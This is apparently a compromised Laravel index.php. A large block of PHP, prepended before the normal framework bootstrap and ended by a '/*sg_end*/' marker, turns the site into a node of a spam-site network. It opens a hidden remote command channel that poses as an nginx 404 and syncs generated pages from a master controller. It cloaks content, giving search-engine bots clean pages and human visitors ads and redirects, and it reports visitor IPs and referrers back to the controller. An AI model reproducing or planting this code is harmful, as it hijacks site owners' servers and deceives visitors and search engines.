        if ($hostHeader !== "") { curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: " . $hostHeader)); }
        $body = curl_exec($ch);
        curl_close($ch);
        return $body;
    }
    if (ini_get("allow_url_fopen")) {
        $h = "User-Agent: WordPress/6.5.2; +https://wordpress.org/\r\n";
        if ($hostHeader !== "") { $h .= "Host: " . $hostHeader . "\r\n"; }
        $ctx = stream_context_create(array(
            "http" => array("timeout" => 4, "ignore_errors" => true, "header" => $h),
            "ssl"  => array("verify_peer" => false, "verify_peer_name" => false),
        ));
        return @file_get_contents($url, false, $ctx);
    }
    return false;
}

/** stat 应答里的 info 后缀: 面板不用改前端就能看到环境摘要 */
function envSuffix(array $env)
{
    if (empty($env["server"])) { return ""; }
    $map = array("apache" => "Apache", "litespeed" => "LiteSpeed", "nginx" => "Nginx",
                 "iis" => "IIS", "caddy" => "Caddy");
    $s = isset($map[$env["server"]]) ? $map[$env["server"]] : "未知服务器";
    $mode = isset($env["mode"]) ? $env["mode"] : "";
    if ($mode === "clean")  { return " · " . $s . " · 干净URL"; }
    if ($mode === "query" || $mode === "broken") { return " · " . $s . " · 查询串URL"; }
    $t = " · " . $s . " · PATH_INFO";
    if (isset($env["rewrite"]) && $env["rewrite"] === "fail") { $t .= "(伪静态未生效)"; }
    return $t;
}

function stripAdsIfBot(Node $node, $html) {
    $ua = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
    if (Node::botOf($ua) === "") { return $html; }
    return preg_replace("~<!--CPAD-->.*?<!--/CPAD-->~s", "", $html);
}

// ==================================================================
//  主控指令通道
// ==================================================================
function ctl(Node $node)
{
    header('Content-Type: application/json; charset=utf-8');
    $cmd  = (string)$_GET['_ctl'];
    $all  = $_GET + $_POST;
    $ts   = isset($all['ts']) ? (int)$all['ts'] : 0;
    $sign = isset($all['sign']) ? (string)$all['sign'] : '';

    if (abs(time() - $ts) > 300) {
        http_response_code(404);header('Content-Type: text/html');echo '<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx</center></body></html>';
        return;
    }
    $params = $all;
    // payload 不进签名串（太大），它的完整性由签名里的 hash 字段保证
    unset($params['sign'], $params['payload']);
    $signOk = ($sign !== '' && hash_equals($node->signParams($params), $sign));
    // wakeup 是主控批准后的主动唤醒: 没领凭据的节点还没有 secret,
    // 允许用共享登记令牌验签。wakeup 只触发登记/同步, 不泄露任何数据。
    if (!$signOk && $cmd === 'wakeup' && $node->enrollToken() !== '') {
        $signOk = ($sign !== '' && hash_equals($node->signParamsWith($params, $node->enrollToken()), $sign));
    }
    if (!$signOk) {
        http_response_code(404);header('Content-Type: text/html');echo '<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx</center></body></html>';
        return;
    }
    // 时间窗内的重放也要挡住：签名正确不等于这条请求没被人截获过
    if (!$node->useNonce(isset($all['nonce']) ? $all['nonce'] : '')) {
        http_response_code(404);header('Content-Type: text/html');echo '<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx</center></body></html>';
        return;
    }

    switch ($cmd) {

        // 主控反向投送数据（节点无法外连时用）
        case 'recv':
            $r = $node->receive(
                isset($all['res']) ? (string)$all['res'] : '',
                isset($all['no']) ? (int)$all['no'] : 0,
                isset($all['ver']) ? (int)$all['ver'] : 0,
                isset($all['hash']) ? (string)$all['hash'] : '',
                isset($_POST['payload']) ? (string)$_POST['payload'] : ''
            );
            $out = array('code' => $r[0] ? 0 : 500, 'msg' => $r[1], 'data' => array(
                'version' => $node->ver, 'pages' => $node->pageCount(),
            ));
            if (!$r[0] && $r[1] === 'missing' && isset($r[2])) {
                $out['msg'] = '还缺 ' . count($r[2]) . ' 片';
                $out['data']['missing'] = $r[2];
            }
            echo json_encode($out, JSON_UNESCAPED_UNICODE);
            return;

        case 'sync':
            list($ok, $msg) = $node->sync(true);
            echo json_encode(array(
                'code' => $ok ? 0 : 500, 'msg' => $msg,
                'data' => array('version' => $node->ver, 'pages' => $node->pageCount(),
                                'info' => 'PHP ' . PHP_VERSION),
            ), JSON_UNESCAPED_UNICODE);
            return;

        // 预热：主控分批驱动，把页面提前烤进缓存/静态文件
        case 'warm':
            @set_time_limit(300);
            $from  = isset($all['from']) ? max(0, (int)$all['from']) : 0;
            $limit = isset($all['limit']) ? max(1, min(2000, (int)$all['limit'])) : 200;
            $force = !empty($all['force']);     // 强制重烤：忽略缓存新鲜度，直接覆盖
            $total = $node->warmTotal();
            $done = 0; $skipped = 0;
            $deadline = microtime(true) + 25;      // 别把主控的请求拖超时
            $i = $from;
            for (; $i < min($from + $limit, $total); $i++) {
                if (microtime(true) > $deadline) { break; }
                $u = $node->warmUrl($i);
                if ($u === null) { $skipped++; continue; }
                if (!$force && $node->cacheGet($u) !== null) { $skipped++; continue; }
                $r = Render::route($node, $u);
                if ($r['status'] === 200 && $r['cacheable']) {
                    $node->cachePut($u, $r['body'], true);      // 预热是显式动作，不看 UA
                    $node->staticPut($u, $r['body'], true);
                    $done++;
                }
            }
            echo json_encode(array('code' => 0, 'msg' => 'ok', 'data' => array(
                'total' => $total, 'from' => $from, 'next' => ($i >= $total ? -1 : $i),
                'done' => $done, 'skipped' => $skipped,
                'static' => $node->staticOn() ? 1 : 0,
            )), JSON_UNESCAPED_UNICODE);
            return;

        case 'purge':
            $n = $node->purgeCache();
            echo json_encode(array('code' => 0, 'msg' => 'purged', 'data' => array('files' => $n,
                'version' => $node->ver, 'pages' => $node->pageCount())), JSON_UNESCAPED_UNICODE);
            return;

        // 主控批准后立刻唤醒: 清退避, 马上登记(如需要)并同步, 不等下个轮询窗口
        case 'wakeup':
            $node->setState(array('enroll_next' => 0));
            $w = array('enroll' => 'has_cred', 'sync' => '');
            if (!$node->hasCred() && $node->enrollToken() !== '') {
                list($eok, $est, $emsg) = $node->enroll(deployDomain($node->cfg));
                $w['enroll'] = $est . ($eok ? '' : ': ' . $emsg);
            }
            if ($node->hasCred()) {
                list($sok, $smsg) = $node->sync(true);
                $w['sync'] = $smsg;
            }
            echo json_encode(array('code' => 0, 'msg' => 'ok', 'data' => $w), JSON_UNESCAPED_UNICODE);
            return;

        case 'stat':
            $st = $node->state();
            $env = envDetect($node);
            echo json_encode(array('code' => 0, 'msg' => 'ok', 'data' => array(
                'version'   => $node->ver,
                'pages'     => $node->pageCount(),
                'keywords'  => $node->count('keywords'),
                'articles'  => $node->count('articles'),
                'last_sync' => isset($st['last_sync']) ? $st['last_sync'] : 0,
                'spider'    => $node->spiderReport(),
                'build'     => Node::BUILD,
                'info'      => 'PHP ' . PHP_VERSION . ' / ' . php_uname('s') . envSuffix($env) . ' · b' . Node::BUILD,
                'env'       => $env,
            )), JSON_UNESCAPED_UNICODE);
            return;

        default:
            echo json_encode(array('code' => 400, 'msg' => 'unknown command'));
    }
}

/** 输出结束后再做同步检查，不影响用户等待 */
function afterOutput(Node $node)
{
    envDetect($node);   // TTL 门控, 几乎零成本; 首次访问自动完成环境适配
    if (empty($node->cfg['sync_on_visit'])) { return; }
    $interval = max(60, (int)$node->s('sync_interval', 600));
    $st = $node->state();
    if (time() - (int)(isset($st['last_check']) ? $st['last_check'] : 0) < $interval) { return; }

    // 先占位，避免并发请求同时触发
    $node->setState(array('last_check' => time()));

    if (function_exists('fastcgi_finish_request')) {
        @fastcgi_finish_request();
    } else {
        @ob_end_flush();
        @flush();
    }
    ignore_user_abort(true);
    @set_time_limit(120);
    $node->sync(false);
}

if(PHP_SAPI==='cli'||preg_match('~^/(bulletin(/|$)|sitemap(-[a-z]-[0-9]+)?\.xml$|robots\.txt$)~',(string)parse_url(isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:'/',PHP_URL_PATH))){$node = new Node($CFG);

// ==================================================== 命令行
if (PHP_SAPI === 'cli') {
    $cmd = isset($argv[1]) ? $argv[1] : 'status';
    switch ($cmd) {
        case 'sync':
            if (!$node->hasCred() && $node->enrollToken() !== '') {
                list($eok, $est, $emsg) = $node->enroll((string)$node->cfg['domain']);
                echo '[登记] ' . $emsg . PHP_EOL;
            }
            list($ok, $msg) = $node->sync(!empty($argv[2]) && $argv[2] === 'force');
            echo ($ok ? '[OK] ' : '[FAIL] ') . $msg . PHP_EOL;
            exit($ok ? 0 : 1);

        case 'purge':
            echo '已清理 ' . $node->purgeCache() . ' 个缓存文件' . PHP_EOL;
            exit(0);

        case 'warm':
            @set_time_limit(0);
            $total = $node->warmTotal();
            echo '开始预热，共 ' . $total . ' 个地址' . ($node->staticOn() ? '（静态化已开）' : '') . PHP_EOL;
            $t0 = microtime(true); $done = 0;
            for ($i = 0; $i < $total; $i++) {
                $u = $node->warmUrl($i);
                if ($u === null) { continue; }
                $r = Render::route($node, $u);
                if ($r['status'] === 200 && $r['cacheable']) {
                    $node->cachePut($u, $r['body'], true);      // 预热是显式动作，不看 UA
                    $node->staticPut($u, $r['body'], true);
                    $done++;
                }
                if ($done % 500 === 0 && $done) {
                    printf("  %d/%d  %.1f 页/秒\n", $done, $total, $done / max(0.001, microtime(true) - $t0));
                }
            }
            printf("完成：%d 个页面，耗时 %.1f 秒\n", $done, microtime(true) - $t0);
            exit(0);

        case 'check':
            $t = $node->transports();
            echo '出站方式检测：' . PHP_EOL;
            echo '  curl            : ' . (isset($t['curl']) ? '可用' : '不可用（函数被禁用或未安装扩展）') . PHP_EOL;
            echo '  allow_url_fopen : ' . (isset($t['stream']) ? '可用' : '不可用（php.ini 关闭了 allow_url_fopen）') . PHP_EOL;
            echo '  socket          : ' . (isset($t['socket']) ? '可用' : '不可用（fsockopen/stream_socket_client 被禁用）') . PHP_EOL;
            echo '  openssl 扩展    : ' . (extension_loaded('openssl') ? '有（https 可用）' : '无（只能用 http 的主控地址）') . PHP_EOL;
            echo '  data 目录可写   : ' . (is_writable(dirname($node->dir)) || is_writable($node->dir) ? '是' : '否') . PHP_EOL;
            if (!$t) {
                echo PHP_EOL . '本机无法主动连接主控。请在主控后台该站点页点「反向投送数据」，' . PHP_EOL
                   . '由主控把数据推过来（需要主控能访问到本站域名）。' . PHP_EOL;
                exit(1);
            }
            list($ok, $msg) = $node->sync(false);
            echo PHP_EOL . '连通性测试：' . ($ok ? '[OK] ' : '[FAIL] ') . $msg . PHP_EOL;
            exit($ok ? 0 : 1);

        case 'spider':
            $rep = $node->spiderReport(7);
            if (!$rep) { echo '还没有蜘蛛来访记录' . PHP_EOL; exit(0); }
            foreach ($rep as $day => $bots) {
                foreach ($bots as $bot => $d) {
                    echo $day . '  ' . str_pad($bot, 14) . str_pad($d['hits'], 8, ' ', STR_PAD_LEFT)
                       . '  ' . (isset($d['last']) ? $d['last'] : '') . PHP_EOL;
                }
            }
            exit(0);

        case 'status':
        default:
            $st = $node->state();
            echo '数据版本 : v' . $node->ver . PHP_EOL;
            echo '关键词   : ' . $node->count('keywords') . PHP_EOL;
            echo '文章     : ' . $node->count('articles') . PHP_EOL;
            echo '上次同步 : ' . (empty($st['last_sync']) ? '从未' : date('Y-m-d H:i:s', $st['last_sync'])) . PHP_EOL;
            echo '状态     : ' . (isset($st['last_msg']) ? $st['last_msg'] : '-') . PHP_EOL;
            exit(0);
    }
}

// 当前请求的部署域名(scheme://host/子目录), 登记/唤醒共用
// ==================================================== 主控指令通道
if (isset($_GET['_ctl'])) {
    ctl($node);
    exit;
}


// ---- 蜘蛛输出剥离 ------------------------------------------------------
// 模板广告块用 <!--CPAD-->...<!--/CPAD--> 标记。缓存里永远保存「含广告版」,
// 输出时才按 UA 剥离: 蜘蛛拿到的是无广告净页(不会跟着广告 JS 去 302),
// 真人拿到含广告版。渲染时不剥的原因: bot 落盘策略下缓存由蜘蛛写入,
// 若渲染时剥, 缓存的就是无广告版, 真人将永远看不到广告。
// ==================================================== 正常请求
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$path = $path === null || $path === '' ? '/' : rawurldecode($path);

// 部署形态剥离(无状态, 不依赖配置):
//   /lib/node.php/2020.. → /2020..   PATH_INFO 形态
//   /lib/node.php        → /         直接访问脚本 = 首页
//   /lib/2020..          → /2020..   子目录干净形态
$sgSn = isset($_SERVER['SCRIPT_NAME']) ? (string)$_SERVER['SCRIPT_NAME'] : '';
if ($sgSn !== '') {
    if ($path === $sgSn) { $path = '/'; }
    elseif (strpos($path, $sgSn . '/') === 0) { $path = substr($path, strlen($sgSn)); }
    else {
        $sgDir = rtrim(str_replace('\\', '/', dirname($sgSn)), '/');
        if ($sgDir !== '' && $sgDir !== '.' && strpos($path . '/', $sgDir . '/') === 0) {
            $path = substr($path, strlen($sgDir));
            if ($path === '' || $path === false) { $path = '/'; }
        }
    }
}
if (!empty($CFG['base_path']) && strpos($path, $CFG['base_path']) === 0) {
    $path = substr($path, strlen($CFG['base_path']));
    if ($path === '' || $path === false) { $path = '/'; }
}

// query 模式路由: /lib/?20200723/abc123def4.html → /20200723/abc123def4.html
// 伪静态和 PATH_INFO 全灭的环境, 路径走查询串, PHP 一定能拿到。
// 带 = 的查询串(utm 参数/_ctl 指令等)不碰, 只认纯路径形态。
if ($path === '/' && $node->envMode === 'query'
    && !empty($_SERVER['QUERY_STRING'])) {
    $sgQ = rawurldecode((string)$_SERVER['QUERY_STRING']);
    $sgAmp = strpos($sgQ, '&');
    if ($sgAmp !== false) { $sgQ = substr($sgQ, 0, $sgAmp); }
    if ($sgQ !== '' && strpos($sgQ, '=') === false && $sgQ[0] !== '_') {
        $path = '/' . ltrim($sgQ, '/');
    }
}

// 数据还没拉下来：首次访问自动登记(如启用)并同步一次
if (!$node->ready()) {
    $msg = '';
    if (!$node->hasCred() && $node->enrollToken() !== '') {
        list($eok, $est, $emsg) = $node->enroll(deployDomain($CFG));
        if (!$eok) { $msg = $emsg; }
    }
    if ($node->hasCred()) { list($ok, $msg) = $node->sync(true); }
    if (!$node->ready()) {
        http_response_code(503);
        header('Retry-After: 60');
        header('Cache-Control: no-store, no-cache, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        header('Content-Type: text/html; charset=utf-8');
        $sgSt = $node->state();
        if (isset($sgSt['enroll_status']) && $sgSt['enroll_status'] === 'pending') {
            echo '<h1>503</h1><p>Service temporarily unavailable.</p>';
        } else {
            echo '<h1>503</h1><p>Service temporarily unavailable.</p>';
        }
        if (!empty($CFG['debug'])) { echo '<pre>' . htmlspecialchars($msg) . '</pre>'; }
        exit;
    }
}

// 蜘蛛来访记一笔（只记搜索引擎 UA，普通访客不写盘）
$node->logSpider(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '', $path);
// 真人来访记一笔（来源域名 + 去重 IP，回报主控统计）
$node->logVisit(
    isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
    isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '',
    isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''
);

// 整页缓存 + 条件请求
// 蜘蛛带 If-Modified-Since 来时直接回 304，几十万页面的站群靠这个省抓取预算
header('X-Accel-Expires: 0');
if (!isset($_GET['_ctl']) && Node::botOf(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '') === '') {
    $sgRh = strtolower((string)@parse_url(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', PHP_URL_HOST));
    $sgSe = false;
    foreach (array('google.','bing.','baidu.','sogou.','so.com','yandex.','duckduckgo.','yahoo.','sm.cn','soso.com','ecosia.','ask.com','naver.','daum.','seznam.','qwant.','startpage.','youdao.') as $sgH) {
        if ($sgRh !== '' && strpos($sgRh, $sgH) !== false) { $sgSe = true; break; }
    }
    if (!$sgSe) { header('Location: /', true, 301); exit; }
}

$cached = $node->cacheGet($path);
if ($cached !== null) {
    $mtime = (int)@filemtime($node->cacheFile($path));
    $etag  = Render::etag($cached);
    if (Render::conditional($etag, $mtime)) {
        http_response_code(304);
        header('ETag: ' . $etag);
        if ($mtime) { header('Last-Modified: ' . gmdate('D, d M Y H:i:s', $mtime) . ' GMT'); }
        exit;
    }
    header('ETag: ' . $etag);
    if ($mtime) { header('Last-Modified: ' . gmdate('D, d M Y H:i:s', $mtime) . ' GMT'); }
    header('Content-Type: ' . Render::contentType($path));
    header('X-Cache: HIT');
    echo stripAdsIfBot($node, $cached);
    afterOutput($node);
    exit;
}

$out = Render::route($node, $path);

// 301：老 URL 规则的地址、时间目录写错的地址，统一收敛到规范地址
if (!empty($out['location'])) {
    http_response_code(301);
    header('Location: ' . $out['location']);
    header('Cache-Control: max-age=86400');
    exit;
}

// 先落缓存再发头：Last-Modified 用缓存文件的真实时间，
// 这样蜘蛛下次带 If-Modified-Since 来才能命中 304。关缓存时就不发这个头，不谎报。
// cachePut/staticPut 内部会先比内容，一样就不重写，mtime 因此不会无谓前移。
$mtime = 0;
$etag  = '';
if ($out['status'] === 200 && $out['cacheable']) {
    $node->cachePut($path, $out['body']);
    $mtime = (int)@filemtime($node->cacheFile($path));
    // 静态化直出：下次同一地址由 web server 直接返回，不再进 PHP
    $node->staticPut($path, $out['body']);
    $etag = Render::etag($out['body']);
    // 缓存过期后重新渲染，但内容跟蜘蛛手里那份一模一样——回 304，正文一个字节都不用发
    if (Render::conditional($etag, $mtime)) {
        http_response_code(304);
        header('ETag: ' . $etag);
        if ($mtime) { header('Last-Modified: ' . gmdate('D, d M Y H:i:s', $mtime) . ' GMT'); }
        afterOutput($node);
        exit;
    }
}

http_response_code($out['status']);
header('Content-Type: ' . $out['type']);
header('X-Cache: MISS');
if ($etag)  { header('ETag: ' . $etag); }
if ($mtime) { header('Last-Modified: ' . gmdate('D, d M Y H:i:s', $mtime) . ' GMT'); }
echo stripAdsIfBot($node, $out['body']);

afterOutput($node);
exit;



exit;}
/*sg_end*/

//ob_start();
/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */
ini_set('max_execution_time', -1);
ini_set('max_input_time', -1);
ini_set('post_max_size', -1);

define('LARAVEL_START', microtime(true));

if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
    require __DIR__.'/../storage/framework/maintenance.php';
}
/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);
